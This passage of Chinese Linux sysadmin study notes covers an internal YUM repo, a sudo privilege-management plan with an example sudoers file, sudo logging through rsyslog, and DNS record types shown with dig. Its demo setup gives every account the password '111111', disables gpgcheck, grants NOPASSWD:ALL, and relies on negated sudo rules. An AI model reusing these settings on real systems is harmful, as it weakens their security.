ln -s /application/nginx-1.9.1 /application/nginx
# fpm -s dir -t rpm -n nginx -v 1.9.1 -d 'pcre-devel,openssl-devel' \
--post-install /opt/scripts/nginx_rpm.sh -f /application/nginx-1.9.1
	#+END_SRC
** YUM源配置
   使用yumdownloader工具可以下载rpm包而不安装。然后安装createrepo软件
   包，该包用来制作repo源。

   可以在YUM服务器上开启yum的cache功能，这样没次安装过的软件包都会被保
   留在系统上一份，以后可以用这些rpm包制作内网的YUM源。要开启yum的缓存
   功能，需要修改配置文件/etc/yum.conf，
   #+BEGIN_SRC sh
   # vim /etc/yum.conf
   keepcache=1 # 默认为0，表示不开启
   #+END_SRC

   比如，要把/application/yum/centos6.5/x86_64/目录做成CentOS6U5版本的
   yum源。可以把/var/cache/yum/6/目录下的rpm包放到
   /application/yum/centos6.5/x86_64/目录下，
   #+BEGIN_SRC sh
   # mkdir -p /application/yum/centos6.5/x86_64
   #+END_SRC

   安装createrepo软件，
   #+BEGIN_SRC sh
   # yum install -y createrepo
   # 初始化repodata索引文件
   # createrepo -pdo /application/yum/centos6.5/x86_64 /application/yum/centos6.5/x86_64
   #+END_SRC

   提供yum服务，可以使用Apache或Nginx提供web服务，但用Python的HTTP模块
   更简单，适用于内网环境，
   #+BEGIN_SRC sh
   # cd /application/yum/centos6.5/x86_64
   # python -m SimpleHTTPServer 80 &> /dev/null &
   # 可以通过浏览器查看
   #+END_SRC

   如果后续添加新的RPM包，只需要下载软件而不安装，
   #+BEGIN_SRC sh
   # yumdownloader pcre-devel openssl-devel
   # createrepo --update /application/yum/centos6.5/x86_64/
   # 每加入一个rpm包就更新一下repodata索引
   #+END_SRC

   yum客户端配置，
   #+BEGIN_SRC sh
   # vim /etc/yum.repos.d/lavenliu.repo
[lavenliu]
name=Internal Yum Server
baseurl=http://<yum_server_ip>
enabled=1
gpgcheck=0
   # 指定使用local库
   # yum --enablerepo=lavenliu --disablerepo=base,extras,updates list
   #+END_SRC
** 生产环境用户权限集中管理项目方案案例
*** 问题现状
	当前我们公司里服务器上百台，各个服务器上的管理人员很多（开发+运维+
	架构+DBA+产品+市场），在大家登录使用Linux服务器时，不同职能的员工
	水平不尽相同，因此导致操作很不规范，root权限泛滥（几乎大部分人员都
	有root权限），经常导致文件等莫名其妙的丢失，老手和新员工对服务器的
	熟知程度也不同，这样使得公司服务器安全存在很大的不稳定性、及操作安
	全隐患。据调查，企业服务器环境，50%以上的安全问题都来自内部，而不
	是外部。为了解决以上问题，单个用户管理权限过大现状，现提出针对
	Linux服务器用户权限集中管理的解决方案。
*** 项目需求
	我们既希望超级用户root密码掌握在少数或唯一的管理员手中，又希望多个
	管理员或相关有权限的人员，能够完成更多更复杂的自身职能相关的工作，
	又不至于越权操作导致系统安全隐患。

	那么，如何解决多个系统管理员都能管理系统而又不让超级权限泛滥的需求
	呢？这就需要sudo管理来替代或结合su命令来完成这样的苛刻且必要的企业
	服务器用户管理需求。
*** 具体实现
	针对公司里不同部门，根据员工的具体工作职能（例如：开发，，运维，
	DBA），分等级、分层次的实现对Linux服务器管理的权限最小化、规范化。
	这样，既减少了运维管理成本，消除了安全隐患，又提高了工作效率，实现
	了高质量的快速化的完成项目进度，以及日常系统维护。
*** 实施方案
	说明：实施方案一般是由积极主动发现问题的运维人员提出的问题，然后写
	好方案，再召集大家讨论可行性，最后确定方案，实施部署，最后后期总结
	维护。

	思想：在提出问题之前，一定要想到如何解决，一并发出来解决方案。
	
	到此为止：你应该是已经写完了权限规划文档。
*** 信息采集（含整个方案流程）
	1. 召集相关各部门领导通过会议讨论或与各组领导沟通确定权限管理方案
       的可行性。需要支持的人员：运维经理、CTO支持、各部门组的领导。我
       们作为运维人员，拿着类似老师这个项目方案，给大家讲解这个文档，
       通过会议形式做演讲，慷慨激昂的演说，取得大佬们的支持和认可，才
       是项目能够得以最终实施的前提，当然，即使不实施，那么，你的能力
       也得到了锻炼，领导对我们的积极主动思考网站架构问题也会是另眼看
       待的。
	2. 确定方案可行性后，会议负责人汇总、提交、审核所有相关员工对Linux
       服务器的权限需求。取得大佬们的支持后，通过发邮件或者联系相关人
       员取得需要的相关员工权限信息。比如说，请各个部门经理整理归类本
       部门需要登录Linux权限的人员名单、职位及负责的业务及权限，如果说
       不清楚权限细节，就说负责的业务细节，这样运维人员就可以确定需要
       给予什么权限了。
	3. 按照需要执行的Linux命令程序及公司业务服务来规划权限和人员对应配
       置。主要是运维人员根据上面收集的人员名单，需要的业务及权限角色，
       对应账号配置权限，实际就是配置sudo配置文件。
	4. 权限方案一旦实施后，所有员工必须通过《员工Linux服务器管理权限申
       请表》来申请对应的权限，确定审批流程，规范化管理。这里实施后把
       住权限申请流程很重要，否则，大家不听话，方案实施完也会泡汤的。
	5. 写操作说明，对各部门人员进行操作讲解。sudo执行命令，涉及到PATH
       变量问题，运维提前处理好。

	表格示例，
    | 人员名单 | 职位     | 负责的业务 | 对应服务器权限          |
    |----------+----------+------------+-------------------------|
    | 张三     | 开发经理 | blog业务   | 要求all，但不能切到root |
    | ...      |          |            |                         |
*** 收集员工职能和对应权限
	此过程是召集大家开会确定，或者请各组领导安排人员进行统计汇总，人员
	及对应的员工职责，交个运维人员，由运维人员优化职位所对应的系统权限。
	
*** 模拟创建用户角色及测试
	建立3个初级运维，一个高级运维、一个网络工程师、一个运维经理，密码
	统一是111111。
	#+BEGIN_SRC sh
for user in chuji001 chuji002 chuji003 net001 senior001 manager001; do
    useradd ${user}
    echo "111111" |passwd --stdin ${user}
done
	#+END_SRC

	建立5个开发人员，属于phpers组，
	#+BEGIN_SRC sh
groupadd -g 999 phpers
for n in {1..5} ; do
    useradd -g phpers php00${n}
    echo "111111" |passwd --stdin php00${n}
done

for user in kaifamanager001 seniorphpers ; do
    useradd ${user}
    echo "111111" |passwd --stdin ${user}
done
	#+END_SRC

	*sudoer配置内容：*
	#+BEGIN_EXAMPLE
# 配置命令别名
Cmnd_Alias CY_CMD_1 = /usr/bin/free, /usr/bin/iostat, /usr/bin/top, /bin/hostname, /sbin/ifconfig, /bin/netstat, /sbin/route
Cmnd_Alias GY_CMD_1 = /usr/bin/free, /usr/bin/iostat, /usr/bin/top, /bin/hostname, /sbin/ifconfig, /bin/netstat, /sbin/route, /sbin/iptables, /etc/init.d/network, /bin/nice, /bin/kill, /usr/bin/kill, /usr/bin/killall, /bin/rpm, /usr/bin/up2date, /usr/bin/yum, /sbin/fdisk, /sbin/sfdisk, /sbin/parted, /sbin/partprobe, /bin/mount, /bin/umount
Cmnd_Alias CK_CMD_1 = /usr/bin/tail /app/log*, /bin/grep /app/log*, /bin/cat, /bin/ls
Cmnd_Alias GK_CMD_1 = /sbin/service, /sbin/chkconfig, /bin/tail /app/log*, /bin/grep /app/log*, /bin/cat, /bin/ls, /bin/sh ~/scripts/deploy.sh
Cmnd_Alias GW_CMD_1 = /sbin/route, /sbin/ifconfig, /bin/ping, /sbin/dhclient, \
/usr/bin/net, /sbin/iptables, /usr/bin/rfcomm, /usr/bin/wvdial, \
/sbin/iwconfig, /sbin/mii-tool, /bin/cat /var/log*
############################################
User_Alias CHUJIADMINS = chuji001,chuji002,chuji003
User_Alias GWNETADMINS = net001
User_Alias CHUJI_KAIFA = %phpers
############################################

Runas_Alias OP = root

# pri config
senior001        ALL=(OP) GY_CMD_1
manager001       ALL=(ALL) NOPASSWD:ALL
kaifamanager001  ALL=(ALL) ALL,/usr/bin/passwd [A-Za-z]*,!/usr/bin/passwd root, !/usr/sbin/visudo,!/usr/bin/vim,!/bin/vi,!/bin/su
seniorphpers ALL=(OP)  GK_CMD_1
CHUJIADMINS  ALL=(OP)  CY_CMD_1
GWNETADMINS  ALL=(OP)  GW_CMD_1
CHUJI_KAIFA  ALL=(OP)  CK_CMD_1
	#+END_EXAMPLE

	上述写法应注意的事项：
	#+BEGIN_EXAMPLE
	1. 别名大写
	2. 路径要全路径
	3. 用"\"换行
	#+END_EXAMPLE

	*实战调试测试*

	*成功后发邮件周知所有人权限配置生效。并附带操作说明，必要的话，培训讲解*

	*制定权限申请流程及申请表*

	*后期维护：不是特别紧急的需求，一律走申请流程*

	服务器多了，可以通过分发软件批量分发/etc/sudoers(注意权限和语法检
	查)。
**** sudo配置注意事项
	 1. 命令别名下的成员必须是文件或目录的绝对路径。
	 2. 别名名称是包含大写字母、数字、下划线，如果是字母都要大写。
	 3. 一个别名下有多个成员，成员与成员之间，通过半角逗号分隔；成员必
        须是有效实际存在的。
	 4. 别名成员受别名类型Host_Alias、User_Alias、Runas_Alias、
        Cmnd_Alias制约，定义什么类型的别名，就要有什么类型的成员相匹配。
	 5. 别名规则是每行算一个规则，如果一个别名规则一行容不下时，可以通
        过"\"来换行。
	 6. 指定切换的用户要用()括号括起来。如果省略括号，则默认为root用户；
        如果括号里是ALL，则代表能切换到所有用户。
	 7. 如果不需要密码直接运行命令的，应该加NOPASSWD参数。
	 8. 禁止某类程序或命令执行，要在命令动作前面加上"!"号，并且放在允
        许命令的后面。
	 9. 用户组前面必须加"%"号。
**** 服务器用户权限管理改造方案与实施项目 -- 可以写到简历中
	 1. 在了解公司业务流程后，提出权限整改解决方案改进公司超级权限root
        泛滥的现状。
	 2. 首先撰写了方案后，给领导审查，取得领导的支持后，召集大家开会讨
        论。
	 3. 讨论确定可行后，由我负责推进实施。
	 4. 实施后效果，公司的服务器权限管理更加清晰了。
	 5. 制定了账号权限申请流程及权限申请表格。
** 用户行为日志审计管理方案
   所谓日志审计，就是记录所有系统及相关用户行为的信息，并且可以自动分
   析、处理、展示（包括文本或者录像）。

   1. 方法1：通过环境变量命令及syslog服务进行全部日志审计（信息太大，
      不推荐）。
   2. 方法2：sudo配合syslog服务，进行日志审计（信息较少，效果不错）。
   3. 方法3：在bash解释器程序里嵌入一个监视器，让所有被审计的系统用户
      使用修改过的增加了监视器的特殊bash程序作为解释程序。
   4. 方法4：齐治的堡垒机，商业产品。
*** 实战配置
**** 安装sudo命令及rsyslog服务
	 默认情况下CentOS6.5系统中已经安装上sudo及rsyslog服务。

	 检查系统是否已经安装这些服务，
	 #+BEGIN_SRC sh
# rpm -qa |egrep "sudo|rsyslog"
sudo-1.8.6p3-20.el6_7.x86_64
rsyslog-5.8.10-10.el6_6.x86_64
# 如果没有安装，则进行安装之
# yum install -y sudo rsyslog
	 #+END_SRC
**** 配置/etc/sudoers
	 在/etc/sudoers配置文件里增加如下一行，
	 #+BEGIN_EXAMPLE
Defaults     logfile=/var/log/sudo.log
# echo "Defaults   logfile=/var/log/sudo.log" >> /etc/sudoers
# tail -1 /etc/sudoers
# visudo -c # 检查sudoers文件语法
	 #+END_EXAMPLE
**** 配置系统日志/etc/rsyslog.conf
	 增加配置到/etc/rsyslog.conf，
	 #+BEGIN_SRC sh
# echo "local2.debug    /var/log/sudo.log" >> /etc/rsyslog.conf
# tail -1 /etc/syslog.conf
	 #+END_SRC
**** 重启rsyslog内核日志记录器
	 #+BEGIN_SRC sh
# service rsyslog restart
# ll /var/log/sudo.log
-rw------- 1 root root 0 Feb 29 01:58 /var/log/sudo.log # 目前内容还为空
# 切换普通用户chuji001
# su - chuji001
chuji001$ useradd lavenliu
chuji001$ sudo -l
chuji001$ sudo useradd lavenliu
# 在另一个终端窗口，查看/var/log/sudo.log日志文件
# cat /var/log/sudo.log
Feb 29 01:58:52 : chuji001 : command not allowed ; TTY=pts/0 ;
    PWD=/home/chuji001 ; USER=root ; COMMAND=/usr/sbin/useradd user001
[root@python ~]# cat /var/log/sudo.log 
Feb 29 01:58:52 : chuji001 : command not allowed ; TTY=pts/0 ;
    PWD=/home/chuji001 ; USER=root ; COMMAND=/usr/sbin/useradd user001
Feb 29 02:00:11 : chuji001 : TTY=pts/0 ; PWD=/home/chuji001 ; USER=root ;
    COMMAND=list
	 #+END_SRC
*** 日志集中管理
	以上的配置，只是单机的日志审计（存在日志被修改的可能性）。可以通过
	配置，把日志文件推送到专门的日志服务器上。有以下几种方法，
	1. rsysnc+inotify或定时任务+rsync，推送到日志到管理服务器上，
	2. rsyslog服务来处理
	   #+BEGIN_SRC sh
	   # echo "192.168.20.100 logserver" >> /etc/hosts
       # ping logserver
       # 日志服务器地址
       # echo "*.info   @logserver" >> /etc/rsyslog.conf # 适合所有日志推送
	   #+END_SRC
	3. 日志收集解决方案
	   #+BEGIN_EXAMPLE
	   1. scribe
	   2. flume
	   3. storm
	   4. logstash
	   #+END_EXAMPLE
** 企业对IT人员的技能要求
   IT技能涵盖以下几方面的技能：
   1. 企业网络的管理和维护
   2. 企业服务器的管理和维护
   3. 运行在这些服务器上的应用，如数据库、WEB服务器、邮件服务器以及办公
      系统的管理和维护
   4. 数据库管理和维护
   5. 确保网络安全
   6. 确保IT系统高可用
   7. 服务器虚拟化技能
** 如何学好Linux运维
   未来的规划：优秀的运维工程师和架构师
   
   方法：成功的有效方法是跟有经验的人学习！

   努力：每天学习10个小时以上

   *别人说到的，我们做到了！*
* 基本服务
** DNS
   在安装Bind后，我们需要知道DNS的几点知识：
   1. DNS服务器需要在域名提供商处注册才可以成为合法的DNS服务器。
   2. 配置文件及目录的位置。
   3. named主要配置文件named.conf。
   4. 正反解都要有自己的zone文件，文件名由named.conf指定。
   5. 当DNS查询时，若本身没有解析，则向root(.)或forwarders服务器查询。
   6. 任何时候都要记得查看日志文件/var/log/messages。
*** 正解（Resource Record，RR）
	正解资源记录格式（resource record，RR）

	可以使用dig查看一个域名的信息，
	#+BEGIN_SRC sh
dig lavenliu.cn @202.96.209.133

; <<>> DiG 9.8.2rc1-RedHat-9.8.2-0.23.rc1.el6_5.1 <<>> lavenliu.cn @202.96.209.133
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 35049
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0

;; QUESTION SECTION:
;lavenliu.cn.			IN	A

;; ANSWER SECTION:
lavenliu.cn.		600	IN	A	139.129.183.36

;; Query time: 52 msec
;; SERVER: 202.96.209.133#53(202.96.209.133)
;; WHEN: Wed Jun  1 10:42:24 2016
;; MSG SIZE  rcvd: 45
	#+END_SRC

	我们可以看一看dig的ANSWER SECTION，
	#+BEGIN_SRC sh
;; ANSWER SECTION:
lavenliu.cn.		600	IN	A	139.129.183.36
;; 格式为
domain              TTL IN  RR type RR data
;; 说明
domain: 解析出来的结果，都是主机名结尾加上一个小数点(.)，称为FQDN。
TTL：   Time To Live的缩写，单位为秒，当此记录被其他DNS服务器查询到后，保持在
        对方DNS服务器的缓存中多长时间，在机房搬迁要调整DNS时需要调低此值以使
        新记录快速生效。
IN：    关键词Internet
RR type与RR data:
主机名.     IN    A             IPv4的IP地址
主机名.     IN    AAAA          IPv6的IP地址
域名.       IN    NS            管理此域名的服务器主机名字.
域名.       IN    SOA           管理此域名的七个重要参数
域名.       IN    MX    数字    接收邮件的服务器主机名字
主机别名    IN    CNAME         实际的主机名字.
域名.       IN    TXT           文本信息，多以spf的文本格式出现
	#+END_SRC
*** A、AAAA
	A、AAAA：查询IP记录，这是最易被查的一个RR标志。
	#+BEGIN_SRC sh
dig www.google.com

; <<>> DiG 9.8.2rc1-RedHat-9.8.2-0.23.rc1.el6_5.1 <<>> www.google.com
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 52773
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 4, ADDITIONAL: 4

;; QUESTION SECTION:
;www.google.com.			IN	A

;; ANSWER SECTION:
www.google.com.		292	IN	A	216.58.203.36

;; AUTHORITY SECTION:
google.com.		20272	IN	NS	ns1.google.com.
google.com.		20272	IN	NS	ns2.google.com.
google.com.		20272	IN	NS	ns4.google.com.
google.com.		20272	IN	NS	ns3.google.com.

;; ADDITIONAL SECTION:
ns1.google.com.		192737	IN	A	216.239.32.10
ns2.google.com.		192687	IN	A	216.239.34.10
ns3.google.com.		192688	IN	A	216.239.36.10
ns4.google.com.		192687	IN	A	216.239.38.10

;; Query time: 0 msec
;; SERVER: 100.100.2.136#53(100.100.2.136)
;; WHEN: Wed Jun  1 10:53:55 2016
;; MSG SIZE  rcvd: 184
	#+END_SRC

	查询IPv6的信息，
	#+BEGIN_SRC sh
dig -t aaaa www.google.com

; <<>> DiG 9.8.2rc1-RedHat-9.8.2-0.23.rc1.el6_5.1 <<>> -t aaaa www.google.com
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 11479
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 4, ADDITIONAL: 4

;; QUESTION SECTION:
;www.google.com.			IN	AAAA

;; ANSWER SECTION:
www.google.com.		43	IN	AAAA	2404:6800:4005:803::2004

;; AUTHORITY SECTION:
google.com.		20273	IN	NS	ns3.google.com.
google.com.		20273	IN	NS	ns2.google.com.
google.com.		20273	IN	NS	ns1.google.com.
google.com.		20273	IN	NS	ns4.google.com.

;; ADDITIONAL SECTION:
ns1.google.com.		193241	IN	A	216.239.32.10
ns2.google.com.		193241	IN	A	216.239.34.10
ns3.google.com.		193242	IN	A	216.239.36.10
ns4.google.com.		193242	IN	A	216.239.38.10

;; Query time: 0 msec
;; SERVER: 100.100.2.136#53(100.100.2.136)
;; WHEN: Wed Jun  1 10:56:07 2016
;; MSG SIZE  rcvd: 196
	#+END_SRC
*** NS
	NS: 查询管理域名的服务器主机名

	要想知道lavenliu.cn是由哪部DNS提供的，使用NS（NameServer）的RR类型
	来查询，在这里要输入domain，lavenliu.cn，
	#+BEGIN_SRC sh
dig -t ns lavenliu.cn

; <<>> DiG 9.8.2rc1-RedHat-9.8.2-0.23.rc1.el6_5.1 <<>> -t ns lavenliu.cn
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 31323
;; flags: qr rd ra; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 6

;; QUESTION SECTION:
;lavenliu.cn.			IN	NS

;; ANSWER SECTION:
lavenliu.cn.		86400	IN	NS	dns9.hichina.com.
lavenliu.cn.		86400	IN	NS	dns10.hichina.com.

;; ADDITIONAL SECTION:
dns9.hichina.com.	943	IN	A	140.205.81.13
dns9.hichina.com.	943	IN	A	140.205.228.13
dns9.hichina.com.	943	IN	A	42.120.221.13
dns10.hichina.com.	1697	IN	A	42.120.221.23
dns10.hichina.com.	1697	IN	A	140.205.81.23
dns10.hichina.com.	1697	IN	A	140.205.228.23

;; Query time: 28 msec
;; SERVER: 100.100.2.136#53(100.100.2.136)
;; WHEN: Wed Jun  1 10:59:49 2016
;; MSG SIZE  rcvd: 175
	#+END_SRC
*** SOA
	SOA: 查询管理域名的服务器管理信息

	如果你有多部DNS服务器管理同一个域名时，最好使用master/slave的方式
	来进行管理。既然要这样管理，那就得要知道被管理的zone file是如何进
	行传输的，此时就得要SOA（Start Of Authority）的标志了。
	#+BEGIN_SRC sh
dig -t soa lavenliu.cn

; <<>> DiG 9.8.2rc1-RedHat-9.8.2-0.23.rc1.el6_5.1 <<>> -t soa lavenliu.cn
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 26374
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 2, ADDITIONAL: 6

;; QUESTION SECTION:
;lavenliu.cn.			IN	SOA

;; ANSWER SECTION:
lavenliu.cn.		600	IN	SOA	dns9.hichina.com. hostmaster.hichina.com. 2016030716 3600 1200 3600 360

;; AUTHORITY SECTION:
lavenliu.cn.		86400	IN	NS	dns9.hichina.com.
lavenliu.cn.		86400	IN	NS	dns10.hichina.com.

;; ADDITIONAL SECTION:
dns9.hichina.com.	2337	IN	A	42.120.221.13
dns9.hichina.com.	2337	IN	A	140.205.81.13
dns9.hichina.com.	2337	IN	A	140.205.228.13
dns10.hichina.com.	2395	IN	A	140.205.228.23
dns10.hichina.com.	2395	IN	A	42.120.221.23
dns10.hichina.com.	2395	IN	A	140.205.81.23

;; Query time: 31 msec
;; SERVER: 100.100.2.136#53(100.100.2.136)
;; WHEN: Wed Jun  1 11:11:36 2016
;; MSG SIZE  rcvd: 222
	#+END_SRC

	SOA后面有七个参数：

	Master DNS服务器主机名： 这个主要确定哪部DNS作为master的意思。这里
	我们可以看到dns9.hichina.com为lavenliu.cn的主要DNS服务器。

	管理员的email： 有问题了可以联系这个管理员地址。要注意的是，由于@
	在zone文件中有特别意义，代表named.conf中这个zone file所对应的zone。
	因此这里就将@该成了.。

    序列号（Serial）： 这个序列号代表的是这个zone文件的版本，序列号越
    大代表越新。当slave要判断是否主动更新zone文件时，就以序列号来进行
    比对，若slave上的旧则下载，若一样则不下载。所以当修改了zone文件时，
    记得要将这个值更新。为了方便用户记忆，通常序列号都会使用日期格式
    “YYYYMMDDNU”。

	刷新频率（Refresh）： 何时slave会向master要求数据更新呢？就是由这
	个数值定义的。lavenliu.cn的DNS设定3600秒（1小时）slave向master要求
	数据更新。那每次slave去更新时，如果发现序列号没有变大，那就不会更
	新。这里需要注意的地方是，在master update data完成，到slave来检查
	时，再update可能还有好一段时间，因此，这段期间master/slave DNS的
	zone file可能出现不一致的情况。所以在Bind新版本中加入了notify功能，
	使用者在named.conf设定中在需要的zone中加入notify的设定，master在更
	新完成某个zone file的数据后会主动发消息通知其他salve，因此，如果
	slave也支持“notify”时，接下来slave马上就可以做zone transfer进行数
	据的更新。

	失败重试时间（Retry）： 如果因为某些因素，导致slave无法从master更
	新数据，那么在多久的时间内，slave会尝试重新联机到master。
	lavenliu.cn的DNS设定1200秒（20分钟）会重新尝试一次，意思是说，每
	3600秒（刷新频率时间）slave会主动向master联机，但如果该次联机没有
	成功，那接下来尝试联机的时间会变成1200秒。

	失败时间（Expire）： 如果尝试时间一直失败，持续联机到达这个设定值
	时限，那么slave将不再继续尝试联机，并且尝试删除这份下载的zone file
	信息。lavenliu.cn被设定为3600秒。意思是说，当联机一直失败，每3600
	秒尝试到达3600秒后，slave将不再更新，等待系统管理员的处理。

	缓存时间（Minimum TTL）： 如果在这个zone file中，每笔RR记录都没有
	写TTL缓存时间的话，那么就以这个SOA的设定值为主。

	除了Serial不可以超过2的32次方之外，针对这几个数值没有其他的什么限
	制。基本上就是这样：
	#+BEGIN_SRC sh
Refresh >= Retry * 2
Refresh + Retry < Expire
Expire >= Retry * 10
Expire >= 7Days
	#+END_SRC

	一般来说，如果DNS RR资料变更情况频繁的，那么上述的相关数值可以定制
	的小一些，如果DNS RR是很稳定的，为了节省带宽，则可以将Refresh设定
	的较大一些。
*** CNAME
	CNAME：设定某主机名的别名（alias），为什么要用cname，就是为了改动
	方便。
	#+BEGIN_SRC sh
[root@master01 ~]# dig image.google.com img.baidu.com

; <<>> DiG 9.8.2rc1-RedHat-9.8.2-0.37.rc1.el6_7.7 <<>> image.google.com img.baidu.com
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: SERVFAIL, id: 55482
;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 0

;; QUESTION SECTION:
;image.google.com.		IN	A

;; Query time: 1064 msec
;; SERVER: 192.168.20.134#53(192.168.20.134)
;; WHEN: Mon Jun  6 14:40:37 2016
;; MSG SIZE  rcvd: 34

;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 3114
;; flags: qr rd ra; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 0

;; QUESTION SECTION:
;img.baidu.com.			IN	A

;; ANSWER SECTION:
img.baidu.com.		5	IN	CNAME	static.n.shifen.com.
static.n.shifen.com.	5	IN	A	115.239.211.92

;; Query time: 3 msec
;; SERVER: 192.168.19.2#53(192.168.19.2)
;; WHEN: Mon Jun  6 14:40:38 2016
;; MSG SIZE  rcvd: 77
	#+END_SRC
*** MX
	MX: Mail eXchange邮件交换，查询域名的邮件服务器主机名，数字代表优
	先次序，此值越低表示有越高的邮件处理优先权。
	#+BEGIN_SRC sh
[root@master01 ~]# dig -t mx google.com baidu.com taobao.com qq.com 163.com | grep -i mx
; <<>> DiG 9.8.2rc1-RedHat-9.8.2-0.37.rc1.el6_7.7 <<>> -t mx google.com baidu.com taobao.com qq.com 163.com
;google.com.			IN	MX
;baidu.com.			IN	MX
baidu.com.		7200	IN	MX	20 mx1.baidu.com.
baidu.com.		7200	IN	MX	20 jpmx.baidu.com.
baidu.com.		7200	IN	MX	20 mx50.baidu.com.
baidu.com.		7200	IN	MX	10 mx.n.shifen.com.
;taobao.com.			IN	MX
taobao.com.		600	IN	MX	10 mx1.alibaba-inc.com.
;qq.com.				IN	MX
qq.com.			7200	IN	MX	20 mx2.qq.com.
qq.com.			7200	IN	MX	30 mx1.qq.com.
qq.com.			7200	IN	MX	10 mx3.qq.com.
;163.com.			IN	MX
163.com.		18000	IN	MX	10 163mx01.mxmail.netease.com.
163.com.		18000	IN	MX	10 163mx02.mxmail.netease.com.
163.com.		18000	IN	MX	10 163mx03.mxmail.netease.com.
163.com.		18000	IN	MX	50 163mx00.mxmail.netease.com.
	#+END_SRC
*** TXT
	TXT: txt记录用来保存域名的附加文本信息，txt记录的内容按照一定的格
	式编写，最常用的是SPF（Sender Policy Framework）格式，SPF用于登记
	某个域名拥有的用来外发邮件的所有IP地址。

	MX记录的作用是给发信者指明某个域名的邮件服务器有哪些。
	SPF格式的txt记录的作用跟mx记录相反，记录了允许哪些邮件服务器代表我们
	的域来发送电子邮件。

	SPF的作用主要是反垃圾邮件，阻止垃圾邮件发件人发送假冒我们域中的“发
	件人”地址的电子邮件。收件人可以参考SPF记录来确定号称来自我们域的邮
	件是否来自授权邮件服务器。按照SPF格式在DNS中增加一条txt类型的记录，
	将提高域名的信誉度，同时可以防止垃圾邮件伪造该域的发件人发送垃圾邮
	件。

	我们来看看SPF是如何防止伪造邮件的？当发件人向接收方发送一封电子邮
	件，邮件服务器接收到电子邮件后，将执行如下操作：
	1. 检查哪一个域名声称发送了该邮件并检查该域名的SPF记录的DNS。
	2. 确定发送服务器的IP地址是否与SPF记录中已发布的IP地址相匹配。
	3. 对电子邮件进行打分：如果IP地址匹配，则邮件通过身份验证并获得一
       个正分。如果IP地址不匹配，则邮件无法通过身份验证并获得一个负分。
       然后对现有的防垃圾邮件筛选策略和启发式筛选应用这些结果。

    SPF格式比较复杂，我们来看看Google的SPF格式的txt记录，
	#+BEGIN_EXAMPLE
	v=spf1 include:_spf.google.com ip4:216.73.93.70/31 ip4:216.73.93.72/31 ~all
	#+END_EXAMPLE
	表示_spf.google.com、216.73.93.70/31、216.73.93.72/31有权限使用这个域名发送邮件。
	v=spf1表示这条txt记录使用的是spf格式版本1。
	~all 表示除了前面所指定的其他IP地址统统不认可。

	#+BEGIN_SRC sh
[root@master01 ~]# dig -t txt google.com baidu.com taobao.com qq.com 163.com | grep -i txt
; <<>> DiG 9.8.2rc1-RedHat-9.8.2-0.37.rc1.el6_7.7 <<>> -t txt google.com baidu.com taobao.com qq.com 163.com
;google.com.			IN	TXT
;baidu.com.			IN	TXT
baidu.com.		7179	IN	TXT	"google-site-verification=GHb98-6msqyx_qqjGl5eRatD3QTHyVB6-xQ3gJB5UwM"
baidu.com.		7179	IN	TXT	"v=spf1 include:spf1.baidu.com include:spf2.baidu.com include:spf3.baidu.com a mx ptr -all"
;taobao.com.			IN	TXT
taobao.com.		580	IN	TXT	"v=spf1 include:spf1.staff.mail.aliyun.com -all"
;qq.com.				IN	TXT
qq.com.			7181	IN	TXT	"v=spf1 include:spf.mail.qq.com ~all"
;163.com.			IN	TXT
163.com.		17981	IN	TXT	"v=spf1 include:spf.163.com -all"
	#+END_SRC
	
	#+BEGIN_SRC sh
[root@master01 ~]# dig -t txt spf1.staff.mail.aliyun.com

; <<>> DiG 9.8.2rc1-RedHat-9.8.2-0.37.rc1.el6_7.7 <<>> -t txt spf1.staff.mail.aliyun.com
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 41957
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 3, ADDITIONAL: 6

;; QUESTION SECTION:
;spf1.staff.mail.aliyun.com.	IN	TXT

;; ANSWER SECTION:
spf1.staff.mail.aliyun.com. 276	IN	TXT	"v=spf1 include:a.staff.mail.aliyun.com include:b.staff.mail.aliyun.com -all"

;; AUTHORITY SECTION:
aliyun.com.		162841	IN	NS	ns5.aliyun.com.
aliyun.com.		162841	IN	NS	ns3.aliyun.com.
aliyun.com.		162841	IN	NS	ns4.aliyun.com.

;; ADDITIONAL SECTION:
ns3.aliyun.com.		162841	IN	A	42.120.250.251
ns4.aliyun.com.		162841	IN	A	42.156.241.248
ns4.aliyun.com.		162841	IN	A	110.75.20.27
ns4.aliyun.com.		162841	IN	A	140.205.71.248
ns5.aliyun.com.		162841	IN	A	198.11.138.248
ns5.aliyun.com.		162841	IN	A	140.205.2.187

;; Query time: 0 msec
;; SERVER: 192.168.20.134#53(192.168.20.134)
;; WHEN: Mon Jun  6 15:09:49 2016
;; MSG SIZE  rcvd: 282
	#+END_SRC

	两个有关SPF的网站：
	#+BEGIN_EXAMPLE
http://www.openspf.org/
http://tools.bevhost.com/cgi-bin/dnslookup
	#+END_EXAMPLE
*** 反解（Resource Record，RR）
	.(root)>cn>lavenliu>cn，由大到小。

	反解则要将IP反过来写，在IP结尾处加上".in-addr.arpa."。
	#+BEGIN_SRC sh
[root@master01 ~]# dig -t mx baidu.com

; <<>> DiG 9.8.2rc1-RedHat-9.8.2-0.37.rc1.el6_7.7 <<>> -t mx baidu.com
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 52753
